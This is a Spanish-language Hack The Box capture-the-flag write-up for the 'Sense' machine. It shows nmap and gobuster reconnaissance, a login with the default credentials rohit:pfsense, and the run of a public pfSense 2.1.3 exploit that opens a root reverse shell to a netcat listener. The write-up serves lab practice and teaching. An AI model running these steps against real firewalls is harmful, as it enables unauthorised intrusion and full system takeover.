---
redirect_from:
  - /posts/SENSE-WriteUp/

title: "Sense - WriteUp"
date: Sun Feb 09 2025 08:15:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, dirb, exploit, gobuster, php, linux, dirbuster, bash]
image: /assets/img/htb-writeups/Pasted-image-20240130191810.png
---

{% include machine-info.html
  machine="Sense"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Sense](/assets/img/htb-writeups/Pasted-image-20240130191810.png)

---

---
----

![SENSE](/assets/img/htb-writeups/Pasted-image-20240130191810.png)

-------

NMAP

```bash
# Nmap 7.94SVN scan initiated Tue Jan 30 19:19:41 2024 as: nmap -sCV -p 80,443 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstra
p.xsl -oN targeted -oX targetedXML 10.129.60.5
Nmap scan report for 10.129.60.5
Host is up (0.061s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.129.60.5/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time
|_http-title: Login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 30 19:20:00 2024 -- 1 IP address (1 host up) scanned in 18.96 seconds
```

HTTP

![SENSE](/assets/img/htb-writeups/Pasted-image-20240130193155.png)

Estamos ante un panel de login de _PFSense_

FUZZING

```bash
$ gobuster dir -u https://10.129.60.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -k --no-error -x php,txt
...
/themes               (Status: 301) [Size: 0] [--> https://10.129.60.5/themes/]
/help.php             (Status: 200) [Size: 6689]
/index.php            (Status: 200) [Size: 6690]
/css                  (Status: 301) [Size: 0] [--> https://10.129.60.5/css/]
/includes             (Status: 301) [Size: 0] [--> https://10.129.60.5/includes/]
/edit.php             (Status: 200) [Size: 6689]
/status.php           (Status: 200) [Size: 6691]
/javascript           (Status: 301) [Size: 0] [--> https://10.129.60.5/javascript/]
'/changelog.txt'      (Status: 200) [Size: 271]
/license.php          (Status: 200) [Size: 6692]
/system.php           (Status: 200) [Size: 6691]
/stats.php            (Status: 200) [Size: 6690]
/classes              (Status: 301) [Size: 0] [--> https://10.129.60.5/classes/]
/widgets              (Status: 301) [Size: 0] [--> https://10.129.60.5/widgets/]
/graph.php            (Status: 200) [Size: 6690]
/tree                 (Status: 301) [Size: 0] [--> https://10.129.60.5/tree/]
/wizard.php           (Status: 200) [Size: 6691]
/shortcuts            (Status: 301) [Size: 0] [--> https://10.129.60.5/shortcuts/]
/pkg.php              (Status: 200) [Size: 6688]
/installer            (Status: 301) [Size: 0] [--> https://10.129.60.5/installer/]
/wizards              (Status: 301) [Size: 0] [--> https://10.129.60.5/wizards/]
/xmlrpc.php           (Status: 200) [Size: 384]
/reboot.php           (Status: 200) [Size: 6691]
/interfaces.php       (Status: 200) [Size: 6695]
/csrf                 (Status: 301) [Size: 0] [--> https://10.129.60.5/csrf/]
'/system-users.txt'   (Status: 200) [Size: 106]
/filebrowser          (Status: 301) [Size: 0] [--> https://10.129.60.5/filebrowser/]
/%7Echeckout%7E       (Status: 403) [Size: 345]
```

Vamos a mirar los archivos de texto encontrados:

![SENSE](/assets/img/htb-writeups/Pasted-image-20240130203337.png)

![SENSE](/assets/img/htb-writeups/Pasted-image-20240130203837.png)

Tenemos un posible nombre de usuario: _Rohit_

Como dice que el password es de por defecto en la empresa, probamos con _pfsense_ y efectivamente, entramos pero con el nombre de usuario en minúsculas.

```http
rohit:pfsense
```

![SENSE](/assets/img/htb-writeups/Pasted-image-20240130204346.png)

Ahora que tenemos credenciales, tenemos la versión exacta y el próximo paso será encontrar exploits.

La versión es la 2.1.3.

Nos bajamos el exploit de https://www.exploit-db.com/exploits/43560

![SENSE](/assets/img/htb-writeups/Pasted-image-20240130211029.png)

Nos ponemos a la escucha con _NetCat_ por el puerto 4444 por ejemplo.

Y lo ejecutamos de la siguiente manera:

```bash
$ python3 pfsense-exploit.py --rhost 10.129.60.5 --lhost 10.10.14.115 --lport 4444 --username rohit --password pfsense

CSRF token obtained
Running exploit...
Exploit completed
```

![SENSE](/assets/img/htb-writeups/Pasted-image-20240130211619.png)

Y accedemos directamente como root!
---

**Última actualización**: 2025-02-09<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
